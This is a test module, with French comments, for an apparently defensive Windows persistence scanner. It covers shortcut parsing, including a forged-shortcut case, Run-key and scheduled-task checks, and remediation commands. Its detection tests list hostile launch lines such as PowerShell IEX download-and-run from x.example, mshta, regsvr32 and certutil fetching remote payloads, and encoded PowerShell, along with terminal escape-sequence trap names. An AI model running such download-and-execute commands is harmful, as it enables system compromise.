    /// Un raccourci fabriqué octet par octet comme Windows l'écrit : en-tête, liste d'éléments du shell, LinkInfo
    /// (chemin local ANSI), arguments en UTF-16, bloc de fin.
    fn raccourci(drapeaux: u32, liste: &[u8], infos: bool, fin: &[u8]) -> Vec<u8> {
        let mut o = vec![0u8; 0x4C];
        o[..4].copy_from_slice(&0x4Cu32.to_le_bytes());
        o[4..20].copy_from_slice(&[1, 0x14, 2, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46]);
        o[0x14..0x18].copy_from_slice(&drapeaux.to_le_bytes());
        if !liste.is_empty() {
            o.extend_from_slice(&u16::try_from(liste.len()).unwrap().to_le_bytes());
            o.extend_from_slice(liste);
        }
        if infos {
            let base = b"C:\\Users\\Public\\c.exe\0";
            let mut bloc = Vec::new();
            let taille = 0x1C + base.len() + 1;
            for champ in [taille, 0x1C, 1, 0, 0x1C, 0, 0x1C + base.len()] {
                bloc.extend_from_slice(&u32::try_from(champ).unwrap().to_le_bytes());
            }
            bloc.extend_from_slice(base);
            bloc.push(0);
            o.extend_from_slice(&bloc);
        }
        if drapeaux & 0x20 != 0 {
            let args: Vec<u16> = "-x".encode_utf16().collect();
            o.extend_from_slice(&u16::try_from(args.len()).unwrap().to_le_bytes());
            o.extend(args.iter().flat_map(|m| m.to_le_bytes()));
        }
        o.extend_from_slice(fin);
        o.extend_from_slice(&0u32.to_le_bytes());
        o
    }

    #[test]
    fn raccourcis_lus_sans_com() {
        let o = raccourci(0x2 | 0x20 | 0x80, &[], true, &[]);
        assert_eq!(
            cible_raccourci(&o),
            Some((r"C:\Users\Public\c.exe".to_string(), "-x".to_string()))
        );
        // Le bloc des variables d'environnement passe avant LinkInfo, comme pour Windows.
        let mut bloc = vec![0u8; 0x314];
        bloc[..4].copy_from_slice(&0x314u32.to_le_bytes());
        bloc[4..8].copy_from_slice(&0xA000_0001u32.to_le_bytes());
        for (i, m) in r"C:\Users\alice\AppData\Roaming\b.vbs".encode_utf16().enumerate() {
            bloc[268 + 2 * i..270 + 2 * i].copy_from_slice(&m.to_le_bytes());
        }
        let o = raccourci(0x2 | 0x20 | 0x80 | 0x200, &[], true, &bloc);
        assert_eq!(cible_raccourci(&o).unwrap().0, r"C:\Users\alice\AppData\Roaming\b.vbs");
        // Sans LinkInfo ni variables (liste d'éléments du shell seule), tronqué ou pas un raccourci : rien, jamais
        // une cible inventée.
        assert_eq!(cible_raccourci(&raccourci(0x20 | 0x80, &[], false, &[])), None);
        let o = raccourci(0x2 | 0x20 | 0x80, &[], true, &[]);
        for n in [0, 10, 0x4C, 0x60, o.len() - 6] {
            assert_eq!(cible_raccourci(&o[..n]), None, "{n}");
        }
        let mut faux = o.clone();
        faux[4] = 0;
        assert_eq!(cible_raccourci(&faux), None);
        // Tailles absurdes : refusées sans paniquer.
        let mut geant = o;
        geant[0x4C..0x50].copy_from_slice(&u32::MAX.to_le_bytes());
        assert_eq!(cible_raccourci(&geant), None);
    }

    /// Un élément de fichier (0x32) ou de dossier (0x31) d'une liste d'éléments du shell, nom court ANSI, suivi de
    /// son extension BEEF0004 version 9 avec le nom long, comme Windows 10 l'écrit ; `nom_long` vide = sans nom long.
    fn element_fichier(genre: u8, nom_court: &str, nom_long: &str) -> Vec<u8> {
        let mut e = vec![genre, 0];
        e.extend_from_slice(&[0; 10]);
        e.extend_from_slice(nom_court.as_bytes());
        e.push(0);
        if e.len() % 2 != 0 {
            e.push(0);
        }
        let mut ext = vec![0u8; 46];
        ext[2..4].copy_from_slice(&9u16.to_le_bytes());
        ext[4..8].copy_from_slice(&[0x04, 0x00, 0xEF, 0xBE]);
        ext.extend(nom_long.encode_utf16().chain([0]).flat_map(u16::to_le_bytes));
        ext.extend_from_slice(&[0, 0]);
        let taille = u16::try_from(ext.len()).unwrap();
        ext[..2].copy_from_slice(&taille.to_le_bytes());
        e.extend_from_slice(&ext);
        let mut element = u16::try_from(e.len() + 2).unwrap().to_le_bytes().to_vec();
        element.extend_from_slice(&e);
        element
    }

    /// Les éléments qui précèdent les dossiers : la racine Poste de travail (0x1F) et le lecteur (0x2F, « C:\ »).
    fn elements_racine() -> Vec<Vec<u8>> {
        let mut racine = vec![20, 0, 0x1F, 0x50];
        racine.extend_from_slice(&[0; 16]);
        let mut lecteur = vec![25, 0, 0x2F];
        lecteur.extend_from_slice(b"C:\\\0");
        lecteur.resize(25, 0);
        vec![racine, lecteur]
    }

    /// Une liste d'éléments du shell complète, terminée par ses deux octets nuls.
    fn liste(elements: &[Vec<u8>]) -> Vec<u8> {
        let mut l: Vec<u8> = elements.concat();
        l.extend_from_slice(&[0, 0]);
        l
    }

    /// La liste de C:\Users\Public\<fichier>, comme Windows l'écrit pour un raccourci du dossier Démarrage.
    fn liste_public(nom_court: &str, nom_long: &str) -> Vec<u8> {
        let mut elements = elements_racine();
        elements.push(element_fichier(0x31, "USERS", "Users"));
        elements.push(element_fichier(0x31, "PUBLIC", "Public"));
        elements.push(element_fichier(0x32, nom_court, nom_long));
        liste(&elements)
    }

    #[test]
    fn raccourci_forge_rendu_a_powershell() {
        let public = r"C:\Users\Public\c.exe";
        // La liste lance m.exe, LinkInfo affiche c.exe (technique publiée de raccourci forgé) : rien, PowerShell
        // résoudra la vraie cible.
        let o = raccourci(0x1 | 0x2 | 0x20 | 0x80, &liste_public("M.EXE", "m.exe"), true, &[]);
        assert_eq!(cible_raccourci(&o), None);
        // Le même nom de fichier dans un autre dossier (C:\Windows\System32\c.exe) : rien non plus.
        let mut elements = elements_racine();
        elements.push(element_fichier(0x31, "WINDOWS", "Windows"));
        elements.push(element_fichier(0x31, "SYSTEM32", "System32"));
        elements.push(element_fichier(0x32, "C.EXE", "c.exe"));
        let o = raccourci(0x1 | 0x2 | 0x20 | 0x80, &liste(&elements), true, &[]);
        assert_eq!(cible_raccourci(&o), None);
        // Liste et LinkInfo d'accord (la casse ne compte pas sous Windows) : lu.
        let o = raccourci(0x1 | 0x2 | 0x20 | 0x80, &liste_public("C.EXE", "C.exe"), true, &[]);
        assert_eq!(cible_raccourci(&o).unwrap().0, public);
        // Sans nom long, le nom court fait foi.
        let o = raccourci(0x1 | 0x2 | 0x80, &liste_public("c.exe", ""), true, &[]);
        assert!(cible_raccourci(&o).is_some());
        // La liste seule, sans LinkInfo : c'est elle que Windows lance, elle suffit.
        let o = raccourci(0x1 | 0x80, &liste_public("C.EXE", "c.exe"), false, &[]);
        assert_eq!(cible_raccourci(&o).unwrap().0, public);
        // Un élément qui n'est pas un fichier (partage réseau), ou une liste sans lecteur : rien.
        let mut reseau = liste_public("c.exe", "c.exe");
        reseau[20 + 25 + 2] = 0x41;
        assert_eq!(cible_raccourci(&raccourci(0x1 | 0x2 | 0x80, &reseau, true, &[])), None);
        let sans_lecteur = liste(&[
            element_fichier(0x31, "PUBLIC", "Public"),
            element_fichier(0x32, "C.EXE", "c.exe"),
        ]);
        assert_eq!(
            cible_raccourci(&raccourci(0x1 | 0x2 | 0x80, &sans_lecteur, true, &[])),
            None
        );
        // Un bloc de variables sans le drapeau HasExpString est ignoré, comme Windows l'ignore.
        let mut bloc = vec![0u8; 0x314];
        bloc[..4].copy_from_slice(&0x314u32.to_le_bytes());
        bloc[4..8].copy_from_slice(&0xA000_0001u32.to_le_bytes());
        for (i, m) in r"C:\Windows\explorer.exe".encode_utf16().enumerate() {
            bloc[268 + 2 * i..270 + 2 * i].copy_from_slice(&m.to_le_bytes());
        }
        let o = raccourci(0x2 | 0x80, &[], true, &bloc);
        assert_eq!(cible_raccourci(&o).unwrap().0, public);
        assert!(memes_chemins(r"C:\A\b.exe", "c:/a/B.EXE/") && !memes_chemins(r"C:\A\b.exe", r"C:\B\b.exe"));
        assert_eq!(chemin_liste(&liste_public("C.EXE", "c.exe")).as_deref(), Some(public));
    }

    #[test]
    fn variables_developpees() {
        let v = |n: &str| (n == "APPDATA").then(|| r"C:\Users\alice\AppData\Roaming".to_string());
        assert_eq!(
            developper(r"%APPDATA%\b.vbs", v),
            r"C:\Users\alice\AppData\Roaming\b.vbs"
        );
        assert_eq!(developper("100% %INCONNUE% %%", v), "100% %INCONNUE% %%");
    }

    /// Sous Wine, les vraies lectures répondent sans planter ; aucun dossier Démarrage relatif (le dossier courant).
    #[test]
    fn lectures_natives_sous_wine() {
        let _ = lignes_run();
        let _ = lignes_demarrage();
        assert!(dossiers_demarrage().iter().all(|d| d.is_absolute()));
    }

    /// Sous Wine, ni le planificateur (GetTasks n'y est qu'une ébauche) ni PowerShell ne répondent : les tâches sont
    /// « non lues », jamais comptées saines.
    #[test]
    fn taches_non_lues_sous_wine() {
        if std::path::Path::new(r"C:\windows\system32\wineboot.exe").is_file() {
            assert!(persistance().iter().any(|c| !c.verifie && c.categorie == "Persistance"));
        }
    }

    #[test]
    fn lancements_suspects() {
        let s = |ligne: &str| {
            let (exe, args) = decouper_commande(ligne);
            lancement_suspect(&exe, &args).is_some()
        };
        // Programmes installés normalement : rien à signaler.
        assert!(!s(r#""C:\Program Files\Steam\steam.exe" -silent"#));
        assert!(!s(
            r"C:\Users\alice\AppData\Local\Discord\Update.exe --processStart Discord.exe"
        ));
        assert!(!s(r"C:\Program Files\Mozilla Firefox\firefox.exe -os-autostart"));
        assert!(!s(
            r#""C:\Program Files\PowerShell\7\pwsh.exe" -ExecutionPolicy Bypass -File C:\Scripts\sauvegarde.ps1"#
        ));
        assert!(!s(r"%windir%\system32\rundll32.exe printui.dll,PrintUIEntry"));
        // Formes de malware.
        assert!(s(r"C:\Users\alice\AppData\Local\Temp\svch0st.exe"));
        assert!(s(r"C:\Users\Public\update.exe /q"));
        assert!(s(
            r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
        ));
        assert!(s(r"powershell -e SQBFAFgA"));
        assert!(s(r"powershell.exe /EncodedCommand SQBFAFgA"));
        assert!(s(
            r#"powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')""#
        ));
        assert!(s(r"mshta.exe https://x.example/a.hta"));
        assert!(s(r"regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll"));
        assert!(s(r"certutil.exe -urlcache -split -f http://x.example/a.exe a.exe"));
        assert!(s(r"wscript.exe C:\Users\alice\AppData\Roaming\x\run.vbs"));
        assert!(s(r"rundll32.exe C:\Users\alice\AppData\Local\Temp\a.dll,Start"));
        assert_eq!(
            decouper_commande(r"C:\Program Files\App\app.exe /min"),
            (r"C:\Program Files\App\app.exe".to_string(), "/min".to_string())
        );
    }

    /// Une valeur Run comme la lecture la rend, à partir de « clé|nom|valeur ».
    fn valeur_run(ligne: &str) -> ValeurRun {
        let [cle, nom, valeur] = ligne.splitn(3, '|').collect::<Vec<_>>()[..] else {
            panic!("{ligne}");
        };
        ValeurRun {
            cle: CLES_RUN.into_iter().find(|c| *c == cle).unwrap(),
            nom: nom.to_string(),
            mots: None,
            valeur: valeur.to_string(),
        }
    }

    /// Le nom d'une valeur Run est choisi par le programme qui se fait relancer : la correction vise ce nom exact,
    /// jamais un motif (« * » retirait toutes les valeurs de la clé, « [svc] » n'en retirait aucune).
    #[test]
    fn retrait_run_sans_joker() {
        let cle = r"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";
        for nom in ["*", "[svc]", "up?date", "l'agent"] {
            let v = valeur_run(&format!(r"{cle}|{nom}|C:\Users\Public\x.exe"));
            let c = juger_persistance(&[], std::slice::from_ref(&v), &[]);
            let commande = &c[0].correctif.as_ref().unwrap().commandes[0];
            assert!(!commande.contains("Remove-ItemProperty"), "{commande}");
            assert!(
                commande.contains(&format!("DeleteValue('{}')", crate::commande::ps_texte(nom))),
                "{commande}"
            );
            assert!(commande.contains(
                r"OpenBaseKey('CurrentUser', 'Registry64').OpenSubKey('Software\Microsoft\Windows\CurrentVersion\Run', $true)"
            ));
        }
        // Valeur par défaut, dans la clé de la machine : nom vide.
        let v = valeur_run(r"HKLM:\Software\Microsoft\Windows\CurrentVersion\Run||C:\Users\Public\x.exe");
        let c = juger_persistance(&[], std::slice::from_ref(&v), &[]);
        let commande = &c[0].correctif.as_ref().unwrap().commandes[0];
        assert!(commande.contains("OpenBaseKey('LocalMachine'") && commande.contains("DeleteValue('')"));
        // Un nom au demi-caractère de substitution isolé est jugé (montré avec pertes), et la correction le réécrit
        // mot par mot.
        let mut v = valeur_run(&format!(r"{cle}|a|C:\Users\Public\x.exe"));
        v.nom = "a\u{FFFD}".to_string();
        v.mots = Some(vec![0x61, 0xD800]);
        let c = juger_persistance(&[], std::slice::from_ref(&v), &[]);
        assert_eq!(c[0].probleme, Some(Niveau::Eleve));
        assert!(c[0].correctif.as_ref().unwrap().commandes[0].contains("DeleteValue((-join [char[]](0x0061,0xD800)))"));
    }

    /// Sous Windows (et Wine, dont le registre marche), un nom de valeur Run en UTF-16 mal formé est lu, pas sauté.
    #[test]
    fn nom_run_mal_forme_lu() {
        use std::os::windows::ffi::OsStringExt;
        use winreg::RegKey;
        use winreg::enums::HKEY_CURRENT_USER;
        let chemin = format!(r"Software\VanguardTest-{}", std::process::id());
        let Ok((cle, _)) = RegKey::predef(HKEY_CURRENT_USER).create_subkey(&chemin) else {
            return crate::essais::saute("registre inaccessible");
        };
        let nom = std::ffi::OsString::from_wide(&[0x61, 0xD800]);
        cle.set_value(&nom, &r"C:\Users\Public\x.exe".to_string()).unwrap();
        let lues: Vec<_> = cle.enum_values_os_string().flatten().collect();
        let _ = RegKey::predef(HKEY_CURRENT_USER).delete_subkey_all(&chemin);
        assert_eq!(lues.len(), 1);
        assert_eq!(lues[0].0, nom);
        // C'est ce que faisait la lecture d'avant : la valeur disparaissait.
        assert!(lues[0].0.to_str().is_none());
    }

    #[test]
    fn persistance_jugee() {
        let taches = [
            r"\|Mise a jour|C:\Users\alice\AppData\Local\Temp\a.exe|",
            r"\Mozilla\|Firefox Default Browser Agent|C:\Program Files\Mozilla Firefox\default-browser-agent.exe|do-task",
        ];
        let c = juger_persistance(&taches, &[], &[]);
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].probleme, Some(Niveau::Eleve));
        assert!(
            c[0].correctif.as_ref().unwrap().commandes[0]
                .contains("Disable-ScheduledTask -TaskPath '\\' -TaskName 'Mise a jour'")
        );
        let run = [valeur_run(
            r#"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|Steam|"C:\Program Files (x86)\Steam\steam.exe" -silent"#,
        )];
        let c = juger_persistance(&[], &run, &[]);
        assert!(c.len() == 1 && c[0].probleme.is_none());
        // Nom de tâche, valeur Run et raccourci choisis par le programme qui les pose : montrés inoffensifs, mais la
        // correction vise le vrai nom.
        let piege = "Maj\x1b]52;c;eA==\x07\x1b[2K\r\u{202e}";
        let taches = [format!(r"\|{piege}|C:\Users\alice\AppData\Local\Temp\a.exe|")];
        let run = [valeur_run(&format!(
            r"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|{piege}|C:\Users\Public\b.exe"
        ))];
        let dem = [format!(
            r"C:\Users\alice\Start Menu\Programs\Startup\{piege}.lnk|C:\Users\Public\c.exe"
        )];
        let (taches, dem): (Vec<&str>, Vec<&str>) = (
            taches.iter().map(String::as_str).collect(),
            dem.iter().map(String::as_str).collect(),
        );
        let c = juger_persistance(&taches, &run, &dem);
        assert_eq!(c.len(), 3);
        for c in &c {
            let k = c.correctif.as_ref().unwrap();
            assert!(!crate::ui::contient_un_piege(&c.message), "{}", c.message);
            assert!(!crate::ui::contient_un_piege(&k.action), "{}", k.action);
            assert!(k.commandes[0].contains(piege), "{}", k.commandes[0]);
        }
    }

    /// T4 : un lancement suspect se reconnaît à sa clé de registre et à sa commande, dans les deux langues.
    #[test]
    fn cles_sans_langue() {
        let run = [ValeurRun {
            cle: "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            nom: "Maj".into(),
            mots: None,
            valeur: "powershell.exe -enc SQBFAFgA".into(),
        }];
        let taches = ["\\|Nettoyage|C:\\Users\\Public\\x.exe|"];
        let cles = crate::machine::controler_regle("WIN-PRS-001", || juger_persistance(&taches, &run, &[]));
        assert_eq!(cles.len(), 2, "{cles:?}");
        assert!(cles.contains(
            &"WIN-PRS-001|run:hkcu:\\software\\microsoft\\windows\\currentversion\\run\\maj=powershell.exe -enc sqbfafga"
                .to_string()
        ));
    }
}
